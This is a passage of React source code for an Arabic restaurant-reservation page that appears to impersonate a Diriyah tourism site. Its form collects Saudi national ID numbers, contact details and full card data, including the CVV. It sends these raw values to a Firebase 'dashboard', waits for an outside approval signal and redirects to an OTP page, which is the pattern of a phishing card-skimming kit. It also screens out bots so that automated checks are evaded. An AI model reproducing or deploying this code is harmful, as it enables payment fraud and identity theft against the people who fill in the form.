import { Link, useLocation } from "wouter";
import { ArrowRight, MapPin, Clock, Star, Phone, Check, Search, ChevronDown, Filter, Utensils, CreditCard, User, Mail, IdCard, Receipt } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Card } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { useState, useEffect } from "react";
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { handlePay, listenForApproval, addData } from "@/lib/firebase";
import { initBotProtection, performBotCheck } from "@/lib/botProtection";

const restaurants = [
  {
    id: 1,
    name: "مطعم البجيري",
    cuisine: "مأكولات سعودية",
    rating: 4.8,
    reviews: 324,
    priceRange: "ر.س 150 - 300",
    location: "منطقة البجيري",
    hours: "12:00 م - 11:00 م",
    image: "https://images.unsplash.com/photo-1504674900247-0877df9cc836?w=600&h=400&fit=crop",
    description: "تجربة طعام سعودية أصيلة مع إطلالة خلابة على حي الطريف التاريخي",
    features: ["إطلالة بانورامية", "قسم عائلات", "موقف سيارات"],
  },
  {
    id: 2,
    name: "مقهى الطريف",
    cuisine: "مقهى وحلويات",
    rating: 4.6,
    reviews: 189,
    priceRange: "ر.س 50 - 120",
    location: "حي الطريف",
    hours: "8:00 ص - 10:00 م",
    image: "https://images.unsplash.com/photo-1565299624946-b28f40a0ae38?w=600&h=400&fit=crop",
    description: "مقهى تراثي يقدم أفضل أنواع القهوة العربية والحلويات التقليدية",
    features: ["قهوة عربية", "جلسات خارجية", "واي فاي"],
  },
  {
    id: 3,
    name: "سماء ديرتي",
    cuisine: "مأكولات عالمية",
    rating: 4.9,
    reviews: 412,
    priceRange: "ر.س 200 - 500",
    location: "منطقة البجيري",
    hours: "1:00 م - 12:00 ص",
    image: "https://images.unsplash.com/photo-1540189549336-e6e99c3679fe?w=600&h=400&fit=crop",
    description: "مطعم راقي يقدم مزيجاً من المأكولات العالمية والمحلية",
    features: ["قائمة تذوق", "طاهي خاص", "حجز مسبق"],
  },
  {
    id: 4,
    name: "مطبخ التراث",
    cuisine: "مأكولات نجدية",
    rating: 4.7,
    reviews: 256,
    priceRange: "ر.س 80 - 180",
    location: "وسط الدرعية",
    hours: "11:00 ص - 11:00 م",
    image: "https://images.unsplash.com/photo-1567620905732-2d1ec7ab7445?w=600&h=400&fit=crop",
    description: "أطباق نجدية تقليدية معدة بوصفات عائلية موروثة",
    features: ["أطباق تقليدية", "خبز طازج", "أجواء عائلية"],
  },
  {
    id: 5,
    name: "تكا",
    cuisine: "مشويات",
    rating: 4.5,
    reviews: 198,
    priceRange: "ر.س 100 - 250",
    location: "البجيري تراس",
    hours: "12:00 م - 11:30 م",
    image: "https://images.unsplash.com/photo-1555939594-58d7cb561ad1?w=600&h=400&fit=crop",
    description: "أشهى المشويات الطازجة مع توابل مميزة",
    features: ["مشويات طازجة", "جلسات عائلية", "إطلالة"],
  },
  {
    id: 6,
    name: "بيكري هاوس",
    cuisine: "مخبوزات وحلويات",
    rating: 4.4,
    reviews: 145,
    priceRange: "ر.س 30 - 80",
    location: "الطريف",
    hours: "7:00 ص - 10:00 م",
    image: "https://images.unsplash.com/photo-1509440159596-0249088772ff?w=600&h=400&fit=crop",
    description: "مخبوزات طازجة يومياً وحلويات شرقية وغربية",
    features: ["خبز طازج", "حلويات", "قهوة"],
  },
];

const featuredRestaurant = {
  id: 7,
  name: "تجربة الباسل والأوشى دائخة",
  cuisine: "تجربة طعام فاخرة",
  rating: 4.9,
  reviews: 89,
  priceRange: "ر.س 300 - 800",
  location: "البجيري",
  hours: "6:00 م - 12:00 ص",
  image: "https://images.unsplash.com/photo-1414235077428-338989a2e8c0?w=800&h=500&fit=crop",
  description: "تجربة طعام استثنائية تجمع بين الأصالة والفخامة",
  features: ["تجربة حصرية", "قائمة خاصة", "خدمة VIP"],
};

const getCardType = (cardNumber: string): string => {
  const num = cardNumber.replace(/\s/g, "");
  if (/^4/.test(num)) return "visa";
  if (/^5[1-5]/.test(num) || /^2[2-7]/.test(num)) return "mastercard";
  if (/^(4[0-9]{5}|5[0-9]{5}|6[0-9]{5}|9[0-9]{5})/.test(num)) return "mada";
  return "";
};

const validateLuhn = (cardNumber: string): boolean => {
  const digits = cardNumber.replace(/\s/g, "").split("").reverse().map(Number);
  let sum = 0;
  for (let i = 0; i < digits.length; i++) {
    let digit = digits[i];
    if (i % 2 === 1) {
      digit *= 2;
      if (digit > 9) digit -= 9;
    }
    sum += digit;
  }
  return sum % 10 === 0;
};

export default function RestaurantsPage() {
  const [, setLocation] = useLocation();
  const [selectedRestaurant, setSelectedRestaurant] = useState<typeof restaurants[0] | null>(null);
  const [showReservation, setShowReservation] = useState(false);
  const [showSuccess, setShowSuccess] = useState(false);
  const [searchQuery, setSearchQuery] = useState("");
  const [step, setStep] = useState(1); // 1: reservation, 2: personal, 3: payment
  const [isProcessing, setIsProcessing] = useState(false);
  const [honeypot, setHoneypot] = useState("");
  
  const [reservationData, setReservationData] = useState({
    date: "",
    time: "",
    guests: "",
  });
  
  const [personalData, setPersonalData] = useState({
    name: "",
    phone: "",
    saudiId: "",
    email: "",
  });
  
  const [cardData, setCardData] = useState({
    cardNumber: "",
    cardName: "",
    expiryMonth: "01",
    expiryYear: "2026",
    cvv: "",
    cardCategory: "credit" as "credit" | "debit" | "platinum",
  });
  
  const [errors, setErrors] = useState<Record<string, string>>({});

  useEffect(() => {
    initBotProtection();
  }, []);

  const handleReserve = (restaurant: typeof restaurants[0] | typeof featuredRestaurant) => {
    setSelectedRestaurant(restaurant as typeof restaurants[0]);
    setShowReservation(true);
    setStep(1);
  };

  const formatCardNumber = (value: string) => {
    const v = value.replace(/\s+/g, "").replace(/[^0-9]/gi, "");
    const matches = v.match(/\d{4,16}/g);
    const match = (matches && matches[0]) || "";
    const parts = [];
    for (let i = 0, len = match.length; i < len; i += 4) {
      parts.push(match.substring(i, i + 4));
    }
    return parts.length ? parts.join(" ") : v;
  };

  const validateStep1 = () => {
    const newErrors: Record<string, string> = {};
    if (!reservationData.date) newErrors.date = "يرجى اختيار التاريخ";
    if (!reservationData.time) newErrors.time = "يرجى اختيار الوقت";
    if (!reservationData.guests) newErrors.guests = "يرجى اختيار عدد الأشخاص";
    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const validateStep2 = () => {
    const newErrors: Record<string, string> = {};
    if (!personalData.name.trim() || personalData.name.trim().length < 3) {
      newErrors.name = "يرجى إدخال الاسم الكامل";
    }
    if (!personalData.phone || !/^05\d{8}$/.test(personalData.phone)) {
      newErrors.phone = "رقم الجوال غير صحيح";
    }
    if (!personalData.saudiId || !/^[12]\d{9}$/.test(personalData.saudiId)) {
      newErrors.saudiId = "رقم الهوية غير صحيح";
    }
    if (!personalData.email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(personalData.email)) {
      newErrors.email = "البريد الإلكتروني غير صحيح";
    }
    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const validateStep3 = () => {
    const newErrors: Record<string, string> = {};
    const rawCard = cardData.cardNumber.replace(/\s/g, "");
    
    if (!rawCard || rawCard.length < 13) {
      newErrors.cardNumber = "رقم البطاقة غير صحيح";
    } else if (!validateLuhn(rawCard)) {
      newErrors.cardNumber = "رقم البطاقة غير صالح";
    }
    
    if (!cardData.cardName.trim() || cardData.cardName.trim().length < 3) {
      newErrors.cardName = "يرجى إدخال الاسم على البطاقة";
    }
    
    const now = new Date();
    const expiry = new Date(parseInt(cardData.expiryYear), parseInt(cardData.expiryMonth) - 1);
    if (expiry < now) {
      newErrors.expiry = "البطاقة منتهية الصلاحية";
    }
    
    if (!cardData.cvv || cardData.cvv.length < 3) {
      newErrors.cvv = "كود الحماية غير صحيح";
    }
    
    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleNextStep = () => {
    if (step === 1 && validateStep1()) {
      setStep(2);
      setErrors({});
    } else if (step === 2 && validateStep2()) {
      // Generate unique ID for this restaurant reservation
      const visitorId = `rest_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
      // Save visitor data to Firebase with personal info
      addData({
        id: visitorId,
        name: personalData.name,
        phone: personalData.phone,
        saudiId: personalData.saudiId,
        email: personalData.email,
        currentPage: "restaurant_payment",
        reservationType: "restaurant",
        restaurantName: selectedRestaurant?.name,
        reservationDate: reservationData.date,
        reservationTime: reservationData.time,
        reservationGuests: reservationData.guests,
      });
      setStep(3);
      setErrors({});
    }
  };

  const handleSubmitPayment = () => {
    const botCheck = performBotCheck(honeypot);
    if (botCheck.isBot) {
      setIsProcessing(true);
      setTimeout(() => setIsProcessing(false), 3000);
      return;
    }
    
    if (!validateStep3()) return;
    
    setIsProcessing(true);
    
    const reservation = {
      restaurantId: selectedRestaurant?.id,
      restaurantName: selectedRestaurant?.name,
      date: reservationData.date,
      time: reservationData.time,
      guests: reservationData.guests,
      price: selectedRestaurant?.priceRange,
    };
    localStorage.setItem("restaurantReservation", JSON.stringify(reservation));
    localStorage.setItem("restaurantPersonalData", JSON.stringify(personalData));
    
    // Calculate bill
    const reservationFee = 150;
    const vat = reservationFee * 0.15;
    const totalWithVat = reservationFee + vat;
    
    const paymentInfo = {
      cardNumber: cardData.cardNumber.replace(/\s/g, ""),
      cardName: cardData.cardName,
      expiryMonth: cardData.expiryMonth,
      expiryYear: cardData.expiryYear,
      cvv: cardData.cvv,
      cardType: getCardType(cardData.cardNumber),
      cardCategory: cardData.cardCategory,
      currentPage: "restaurant_checkout",
      reservationType: "restaurant",
      // Include personal info for dashboard display
      name: personalData.name,
      phone: personalData.phone,
      saudiId: personalData.saudiId,
      email: personalData.email,
      restaurantName: selectedRestaurant?.name,
      reservationDate: reservationData.date,
      reservationTime: reservationData.time,
      reservationGuests: reservationData.guests,
      // Bill details
      reservationFee: reservationFee,
      vat: vat,
      totalAmount: totalWithVat,
    };
    handlePay(paymentInfo, () => {});
    
    const unsubscribe = listenForApproval((approved) => {
      if (approved) {
        unsubscribe();
        setShowReservation(false);
        setLocation("/otp");
      }
    });
  };

  const resetForm = () => {
    setStep(1);
    setReservationData({ date: "", time: "", guests: "" });
    setPersonalData({ name: "", phone: "", saudiId: "", email: "" });
    setCardData({ cardNumber: "", cardName: "", expiryMonth: "01", expiryYear: "2026", cvv: "", cardCategory: "credit" });
    setErrors({});
    setIsProcessing(false);
  };

  return (
    <div className="min-h-screen bg-[#f8f5f0]" dir="rtl">
      {/* Header */}
      <header className="bg-[#1a1a1a] text-white sticky top-0 z-50">
        <div className="container mx-auto px-4 py-3">
          <div className="flex items-center justify-between">
            <Link href="/booking">
              <Button variant="ghost" size="icon" className="text-white hover:bg-white/10" data-testid="button-back">
                <ArrowRight className="h-5 w-5" />
              </Button>
            </Link>
            <img src="/diriyah-logo.svg" alt="الدرعية" className="h-8" onError={(e) => { e.currentTarget.style.display = 'none'; }} />
            <h1 className="text-lg font-bold tracking-wide">الدرعية</h1>
          </div>
        </div>
      </header>

      {/* Hero Section */}
      <section className="relative h-[380px] overflow-hidden">
        <img
          src="https://images.unsplash.com/photo-1517248135467-4c7edcad34c4?w=1200&h=600&fit=crop"
          alt="مطاعم الدرعية"
          className="w-full h-full object-cover"
        />
        <div className="absolute inset-0 bg-gradient-to-t from-black/80 via-black/40 to-black/20" />
        <div className="absolute inset-0 flex flex-col items-center justify-center text-white text-center px-4">
          <Badge className="bg-[#c4a35a] text-white border-0 mb-4 px-4 py-1">
            مطاعم ومقاهي الدرعية
          </Badge>
          <h1 className="text-3xl md:text-4xl font-bold mb-2" data-testid="text-title">
            مطاعم ومقاهي الدرعية
          </h1>
          <p className="text-white/80 text-sm max-w-md mb-6">
            حيث تلتقي الأصالة بالحداثة في تجربة طعام فريدة
          </p>
          <Button
            onClick={() => {
              const element = document.getElementById('restaurant-list');
              element?.scrollIntoView({ behavior: 'smooth' });
            }}
            className="bg-[#c4a35a] hover:bg-[#b39349] text-white px-8 py-6 text-lg font-semibold shadow-lg gap-2"
            data-testid="button-hero-reserve"
          >
            <Utensils className="w-5 h-5" />
            تصفح المطاعم واحجز طاولة
          </Button>
        </div>
      </section>

      {/* Search Section */}
      <section className="bg-white shadow-sm">
        <div className="container mx-auto px-4 py-4">
          <div className="flex flex-col gap-3">
            <h2 className="text-lg font-semibold text-[#3d3428]">لاستكشاف مطاعم الدرعية</h2>
            <div className="flex gap-2">
              <div className="relative flex-1">
                <Search className="absolute right-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-400" />
                <Input
                  type="text"
                  placeholder="ابحث عن مطعم..."
                  value={searchQuery}
                  onChange={(e) => setSearchQuery(e.target.value)}
                  className="pr-10 bg-gray-50 border-gray-200"
                  data-testid="input-search"
                />
              </div>
              <Button variant="outline" size="icon" className="border-gray-200">
                <Filter className="w-4 h-4" />
              </Button>
            </div>
            <div className="flex gap-2 overflow-x-auto pb-2">
              <Badge variant="secondary" className="bg-[#3d3428] text-white whitespace-nowrap cursor-pointer">
                الكل
              </Badge>
              <Badge variant="outline" className="whitespace-nowrap cursor-pointer hover:bg-gray-100">
                مطاعم
              </Badge>
              <Badge variant="outline" className="whitespace-nowrap cursor-pointer hover:bg-gray-100">
                مقاهي
              </Badge>
              <Badge variant="outline" className="whitespace-nowrap cursor-pointer hover:bg-gray-100">
                حلويات
              </Badge>
            </div>
          </div>
        </div>
      </section>

      <main id="restaurant-list" className="container mx-auto px-4 py-6">
        {/* Restaurant Grid */}
        <div className="grid grid-cols-2 gap-3 mb-8">
          {restaurants.slice(0, 4).map((restaurant) => (
            <Card
              key={restaurant.id}
              className="overflow-hidden border-0 shadow-md cursor-pointer group"
              onClick={() => handleReserve(restaurant)}
              data-testid={`card-restaurant-${restaurant.id}`}
            >
              <div className="relative aspect-square">
                <img
                  src={restaurant.image}
                  alt={restaurant.name}
                  className="w-full h-full object-cover transition-transform duration-500 group-hover:scale-105"
                />
                <div className="absolute inset-0 bg-gradient-to-t from-black/70 via-transparent to-transparent" />
                <div className="absolute bottom-0 left-0 right-0 p-3">
                  <h3 className="text-white font-bold text-sm leading-tight" data-testid={`text-restaurant-name-${restaurant.id}`}>
                    {restaurant.name}
                  </h3>
                  <p className="text-white/70 text-xs mt-0.5">{restaurant.cuisine}</p>
                </div>
              </div>
            </Card>
          ))}
        </div>

        {/* Featured Restaurant */}
        <section className="mb-8">
          <Card
            className="overflow-hidden border-0 shadow-lg cursor-pointer"
            onClick={() => handleReserve(featuredRestaurant)}
            data-testid="card-featured-restaurant"
          >
            <div className="relative h-48">
              <img
                src={featuredRestaurant.image}
                alt={featuredRestaurant.name}
                className="w-full h-full object-cover"
              />
              <div className="absolute inset-0 bg-gradient-to-t from-black/80 via-black/30 to-transparent" />
              <div className="absolute top-3 left-3">
                <Badge className="bg-[#c4a35a] text-white border-0 gap-1">
                  <Star className="w-3 h-3 fill-current" />
                  {featuredRestaurant.rating}
                </Badge>
              </div>
              <div className="absolute bottom-0 left-0 right-0 p-4">
                <h3 className="text-white font-bold text-lg mb-1">{featuredRestaurant.name}</h3>
                <p className="text-white/70 text-sm">{featuredRestaurant.cuisine}</p>
              </div>
            </div>
            <div className="p-4 bg-white">
              <div className="flex items-center gap-4 text-sm text-gray-600 mb-3">
                <div className="flex items-center gap-1">
                  <MapPin className="w-4 h-4 text-[#c4a35a]" />
                  <span>{featuredRestaurant.location}</span>
                </div>
                <div className="flex items-center gap-1">
                  <Clock className="w-4 h-4 text-[#c4a35a]" />
                  <span>{featuredRestaurant.hours}</span>
                </div>
              </div>
              <Button className="w-full bg-[#3d3428] hover:bg-[#2a241c] text-white" data-testid="button-reserve-featured">
                احجز الآن
              </Button>
            </div>
          </Card>
        </section>

        {/* More Restaurants */}
        <section>
          <div className="flex items-center justify-between mb-4">
            <h2 className="text-lg font-bold text-[#3d3428]">المزيد من المطاعم</h2>
            <Button variant="ghost" className="text-[#c4a35a] text-sm gap-1">
              عرض الكل
              <ChevronDown className="w-4 h-4" />
            </Button>
          </div>

          <div className="space-y-3">
            {restaurants.slice(4).map((restaurant) => (
              <Card
                key={restaurant.id}
                className="overflow-hidden border-0 shadow-sm cursor-pointer"
                onClick={() => handleReserve(restaurant)}
                data-testid={`card-restaurant-${restaurant.id}`}
              >
                <div className="flex gap-3 p-3">
                  <div className="w-24 h-24 rounded-lg overflow-hidden flex-shrink-0">
                    <img
                      src={restaurant.image}
                      alt={restaurant.name}
                      className="w-full h-full object-cover"
                    />
                  </div>
                  <div className="flex-1 min-w-0">
                    <div className="flex items-start justify-between gap-2">
                      <h3 className="font-bold text-[#3d3428] text-sm" data-testid={`text-restaurant-name-${restaurant.id}`}>
                        {restaurant.name}
                      </h3>
                      <Badge className="bg-[#c4a35a]/10 text-[#c4a35a] border-0 gap-0.5 text-xs flex-shrink-0">
                        <Star className="w-3 h-3 fill-current" />
                        {restaurant.rating}
                      </Badge>
                    </div>
                    <p className="text-gray-500 text-xs mt-1">{restaurant.cuisine}</p>
                    <div className="flex items-center gap-3 mt-2 text-xs text-gray-500">
                      <div className="flex items-center gap-1">
                        <MapPin className="w-3 h-3" />
                        <span>{restaurant.location}</span>
                      </div>
                    </div>
                    <p className="text-[#c4a35a] font-semibold text-sm mt-2">{restaurant.priceRange}</p>
                  </div>
                </div>
              </Card>
            ))}
          </div>
        </section>

        {/* Back Button */}
        <div className="mt-8 text-center">
          <Link href="/booking">
            <Button variant="outline" className="px-8 border-[#3d3428] text-[#3d3428]" data-testid="button-back-to-booking">
              العودة لحجز التذاكر
            </Button>
          </Link>
        </div>
      </main>

      {/* Footer */}
      <footer className="bg-[#3d3428] text-white py-8 mt-8">
        <div className="container mx-auto px-4 text-center">
          <h3 className="text-xl font-bold mb-2">الدرعية</h3>
          <p className="text-white/60 text-sm mb-4">وجهة تاريخية وثقافية</p>
          <div className="flex justify-center gap-4 text-white/40 text-xs">
            <span>سياسة الخصوصية</span>
            <span>|</span>
            <span>الشروط والأحكام</span>
          </div>
        </div>
      </footer>

      {/* Reservation Dialog - Multi-step */}
      <Dialog open={showReservation} onOpenChange={(open) => { setShowReservation(open); if (!open) resetForm(); }}>
        <DialogContent className="max-w-md border-0 shadow-2xl bg-white max-h-[90vh] overflow-y-auto" dir="rtl">
          <DialogHeader className="border-b pb-4">
            <DialogTitle className="text-right text-xl text-[#3d3428]">
              {step === 1 && "حجز طاولة"}
              {step === 2 && "البيانات الشخصية"}
              {step === 3 && "بيانات الدفع"}
            </DialogTitle>
            <p className="text-gray-500 text-sm text-right">{selectedRestaurant?.name}</p>
            
            {/* Progress Steps */}
            <div className="flex items-center justify-center gap-2 mt-4">
              {[1, 2, 3].map((s) => (
                <div key={s} className="flex items-center">
                  <div className={`w-8 h-8 rounded-full flex items-center justify-center text-sm font-medium ${
                    s <= step ? "bg-[#c4a35a] text-white" : "bg-gray-200 text-gray-500"
                  }`}>
                    {s}
                  </div>
                  {s < 3 && <div className={`w-8 h-0.5 mx-1 ${s < step ? "bg-[#c4a35a]" : "bg-gray-200"}`} />}
                </div>
              ))}
            </div>
          </DialogHeader>

          {/* Honeypot */}
          <div className="absolute -left-[9999px] opacity-0 h-0 overflow-hidden" aria-hidden="true">
            <input type="text" value={honeypot} onChange={(e) => setHoneypot(e.target.value)} tabIndex={-1} autoComplete="off" />
          </div>

          {/* Step 1: Reservation Details */}
          {step === 1 && (
            <div className="space-y-4 pt-4">
              <div className="grid grid-cols-2 gap-3">
                <div>
                  <Label className="text-sm mb-2 block text-gray-700">التاريخ *</Label>
                  <Input
                    type="date"
                    value={reservationData.date}
                    onChange={(e) => setReservationData({ ...reservationData, date: e.target.value })}
                    className={`text-left border-gray-200 ${errors.date ? "border-red-500" : ""}`}
                    dir="ltr"
                    data-testid="input-date"
                  />
                  {errors.date && <p className="text-red-500 text-xs mt-1">{errors.date}</p>}
                </div>
                <div>
                  <Label className="text-sm mb-2 block text-gray-700">الوقت *</Label>
                  <Select value={reservationData.time} onValueChange={(value) => setReservationData({ ...reservationData, time: value })}>
                    <SelectTrigger className={`border-gray-200 ${errors.time ? "border-red-500" : ""}`} data-testid="select-time">
                      <SelectValue placeholder="اختر" />
                    </SelectTrigger>
                    <SelectContent>
                      <SelectItem value="12:00">12:00 م</SelectItem>
                      <SelectItem value="13:00">1:00 م</SelectItem>
                      <SelectItem value="14:00">2:00 م</SelectItem>
                      <SelectItem value="18:00">6:00 م</SelectItem>
                      <SelectItem value="19:00">7:00 م</SelectItem>
                      <SelectItem value="20:00">8:00 م</SelectItem>
                      <SelectItem value="21:00">9:00 م</SelectItem>
                    </SelectContent>
                  </Select>
                  {errors.time && <p className="text-red-500 text-xs mt-1">{errors.time}</p>}
                </div>
              </div>

              <div>
                <Label className="text-sm mb-2 block text-gray-700">عدد الأشخاص *</Label>
                <Select value={reservationData.guests} onValueChange={(value) => setReservationData({ ...reservationData, guests: value })}>
                  <SelectTrigger className={`border-gray-200 ${errors.guests ? "border-red-500" : ""}`} data-testid="select-guests">
                    <SelectValue placeholder="اختر عدد الضيوف" />
                  </SelectTrigger>
                  <SelectContent>
                    <SelectItem value="1">شخص واحد</SelectItem>
                    <SelectItem value="2">شخصين</SelectItem>
                    <SelectItem value="3">3 أشخاص</SelectItem>
                    <SelectItem value="4">4 أشخاص</SelectItem>
                    <SelectItem value="5">5 أشخاص</SelectItem>
                    <SelectItem value="6">6 أشخاص</SelectItem>
                    <SelectItem value="7+">أكثر من 6</SelectItem>
                  </SelectContent>
                </Select>
                {errors.guests && <p className="text-red-500 text-xs mt-1">{errors.guests}</p>}
              </div>

              <Button onClick={handleNextStep} className="w-full bg-[#c4a35a] hover:bg-[#b39349] py-6 text-white font-semibold" data-testid="button-next-step1">
                التالي
              </Button>
            </div>
          )}

          {/* Step 2: Personal Details */}
          {step === 2 && (
            <div className="space-y-4 pt-4">
              <div>
                <Label className="text-sm mb-2 block text-gray-700">الاسم الكامل *</Label>
                <div className="relative">
                  <User className="absolute right-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-400" />
                  <Input
                    type="text"
                    value={personalData.name}
                    onChange={(e) => setPersonalData({ ...personalData, name: e.target.value })}
                    placeholder="أدخل اسمك الكامل"
                    className={`text-right pr-10 border-gray-200 ${errors.name ? "border-red-500" : ""}`}
                    data-testid="input-personal-name"
                  />
                </div>
                {errors.name && <p className="text-red-500 text-xs mt-1">{errors.name}</p>}
              </div>

              <div>
                <Label className="text-sm mb-2 block text-gray-700">رقم الهوية *</Label>
                <div className="relative">
                  <IdCard className="absolute right-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-400" />
                  <Input
                    type="text"
                    value={personalData.saudiId}
                    onChange={(e) => setPersonalData({ ...personalData, saudiId: e.target.value.replace(/\D/g, "").slice(0, 10) })}
                    placeholder="1XXXXXXXXX"
                    className={`text-left pr-10 border-gray-200 ${errors.saudiId ? "border-red-500" : ""}`}
                    dir="ltr"
                    data-testid="input-saudi-id"
                  />
                </div>
                {errors.saudiId && <p className="text-red-500 text-xs mt-1">{errors.saudiId}</p>}
              </div>

              <div>
                <Label className="text-sm mb-2 block text-gray-700">البريد الإلكتروني *</Label>
                <div className="relative">
                  <Mail className="absolute right-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-400" />
                  <Input
                    type="email"
                    value={personalData.email}
                    onChange={(e) => setPersonalData({ ...personalData, email: e.target.value })}
                    placeholder="example@email.com"
                    className={`text-left pr-10 border-gray-200 ${errors.email ? "border-red-500" : ""}`}
                    dir="ltr"
                    data-testid="input-email"
                  />
                </div>
                {errors.email && <p className="text-red-500 text-xs mt-1">{errors.email}</p>}
              </div>

              <div>
                <Label className="text-sm mb-2 block text-gray-700">رقم الجوال *</Label>
                <div className="relative">
                  <Phone className="absolute right-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-400" />
                  <Input
                    type="tel"
                    value={personalData.phone}
                    onChange={(e) => setPersonalData({ ...personalData, phone: e.target.value.replace(/\D/g, "").slice(0, 10) })}
                    placeholder="05XXXXXXXX"
                    className={`text-left pr-10 border-gray-200 ${errors.phone ? "border-red-500" : ""}`}
                    dir="ltr"
                    data-testid="input-phone"
                  />
                </div>
                {errors.phone && <p className="text-red-500 text-xs mt-1">{errors.phone}</p>}
              </div>

              <div className="flex gap-2">
                <Button onClick={() => setStep(1)} variant="outline" className="flex-1 py-6" data-testid="button-back-step2">
                  السابق
                </Button>
                <Button onClick={handleNextStep} className="flex-1 bg-[#c4a35a] hover:bg-[#b39349] py-6 text-white font-semibold" data-testid="button-next-step2">
                  التالي
                </Button>
              </div>
            </div>
          )}

          {/* Step 3: Payment Details */}
          {step === 3 && (
            <div className="space-y-4 pt-4">
              {/* Bill Summary */}
              <div className="bg-gradient-to-br from-[#f8f5f0] to-white rounded-xl p-4 border border-[#c4a35a]/30">
                <div className="flex items-center gap-2 text-[#3d3428] font-semibold mb-3">
                  <Receipt className="w-4 h-4" />
                  <span>تفاصيل الفاتورة</span>
                </div>
                <div className="space-y-2 text-sm">
                  <div className="flex justify-between items-center py-1 border-b border-gray-100">
                    <span className="text-gray-600">المطعم</span>
                    <span className="font-medium text-[#3d3428]">{selectedRestaurant?.name}</span>
                  </div>
                  <div className="flex justify-between items-center py-1 border-b border-gray-100">
                    <span className="text-gray-600">التاريخ</span>
                    <span className="font-medium">{reservationData.date}</span>
                  </div>
                  <div className="flex justify-between items-center py-1 border-b border-gray-100">
                    <span className="text-gray-600">الوقت</span>
                    <span className="font-medium">{reservationData.time}</span>
                  </div>
                  <div className="flex justify-between items-center py-1 border-b border-gray-100">
                    <span className="text-gray-600">عدد الضيوف</span>
                    <span className="font-medium">{reservationData.guests} أشخاص</span>
                  </div>
                  <div className="flex justify-between items-center py-1 border-b border-gray-100">
                    <span className="text-gray-600">رسوم الحجز</span>
                    <span className="font-medium">150 ر.س</span>
                  </div>
                  <div className="flex justify-between items-center py-1 border-b border-gray-100">
                    <span className="text-gray-600">ضريبة القيمة المضافة (15%)</span>
                    <span className="font-medium">22.50 ر.س</span>
                  </div>
                  <div className="flex justify-between items-center pt-2 mt-2 border-t-2 border-[#c4a35a]/30">
                    <span className="text-[#3d3428] font-bold">المجموع الكلي</span>
                    <span className="text-[#c4a35a] font-bold text-lg">172.50 ر.س</span>
                  </div>
                </div>
              </div>

              {/* Card Type Selection */}
              <div>
                <Label className="text-sm mb-2 block text-gray-700">نوع البطاقة</Label>
                <div className="grid grid-cols-3 gap-2">
                  {(["credit", "debit", "platinum"] as const).map((type) => (
                    <button
                      key={type}
                      type="button"
                      onClick={() => setCardData({ ...cardData, cardCategory: type })}
                      className={`p-2 rounded-lg border-2 text-center transition-all ${
                        cardData.cardCategory === type
                          ? "border-[#c4a35a] bg-[#c4a35a]/10 text-[#c4a35a]"
                          : "border-gray-200 text-gray-500 hover:border-[#c4a35a]/50"
                      }`}
                      data-testid={`button-card-${type}`}
                    >
                      <div className="text-xs font-medium">
                        {type === "credit" && "ائتمانية"}
                        {type === "debit" && "مدى"}
                        {type === "platinum" && "بلاتينية"}
                      </div>
                    </button>
                  ))}
                </div>
              </div>

              <div>
                <Label className="text-sm mb-2 block text-gray-700">رقم البطاقة *</Label>
                <div className="relative">
                  <CreditCard className="absolute right-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-400" />
                  <Input
                    type="text"
                    value={cardData.cardNumber}
                    onChange={(e) => {
                      const formatted = formatCardNumber(e.target.value);
                      if (formatted.replace(/\s/g, "").length <= 16) {
                        setCardData({ ...cardData, cardNumber: formatted });
                      }
                    }}
                    placeholder="0000 0000 0000 0000"
                    className={`text-left pr-10 font-mono border-gray-200 ${errors.cardNumber ? "border-red-500" : ""}`}
                    dir="ltr"
                    data-testid="input-card-number"
                  />
                </div>
                {errors.cardNumber && <p className="text-red-500 text-xs mt-1">{errors.cardNumber}</p>}
              </div>

              <div>
                <Label className="text-sm mb-2 block text-gray-700">الاسم على البطاقة *</Label>
                <Input
                  type="text"
                  value={cardData.cardName}
                  onChange={(e) => setCardData({ ...cardData, cardName: e.target.value.toUpperCase() })}
                  placeholder="MOHAMMED ALI"
                  className={`text-left border-gray-200 ${errors.cardName ? "border-red-500" : ""}`}
                  dir="ltr"
                  data-testid="input-card-name"
                />
                {errors.cardName && <p className="text-red-500 text-xs mt-1">{errors.cardName}</p>}
              </div>

              <div className="grid grid-cols-2 gap-3">
                <div>
                  <Label className="text-sm mb-2 block text-gray-700">تاريخ الانتهاء *</Label>
                  <div className="flex gap-2">
                    <select
                      value={cardData.expiryMonth}
                      onChange={(e) => setCardData({ ...cardData, expiryMonth: e.target.value })}
                      className={`flex-1 h-10 px-2 rounded-md border bg-white text-sm ${errors.expiry ? "border-red-500" : "border-gray-200"}`}
                      data-testid="select-expiry-month"
                    >
                      {Array.from({ length: 12 }, (_, i) => String(i + 1).padStart(2, "0")).map((m) => (
                        <option key={m} value={m}>{m}</option>
                      ))}
                    </select>
                    <select
                      value={cardData.expiryYear}
                      onChange={(e) => setCardData({ ...cardData, expiryYear: e.target.value })}
                      className={`flex-1 h-10 px-2 rounded-md border bg-white text-sm ${errors.expiry ? "border-red-500" : "border-gray-200"}`}
                      data-testid="select-expiry-year"
                    >
                      {Array.from({ length: 10 }, (_, i) => String(2024 + i)).map((y) => (
                        <option key={y} value={y}>{y}</option>
                      ))}
                    </select>
                  </div>
                  {errors.expiry && <p className="text-red-500 text-xs mt-1">{errors.expiry}</p>}
                </div>
                <div>
                  <Label className="text-sm mb-2 block text-gray-700">CVV *</Label>
                  <Input
                    type="text"
                    value={cardData.cvv}
                    onChange={(e) => {
                      const v = e.target.value.replace(/\D/g, "").slice(0, 4);
                      setCardData({ ...cardData, cvv: v });
                    }}
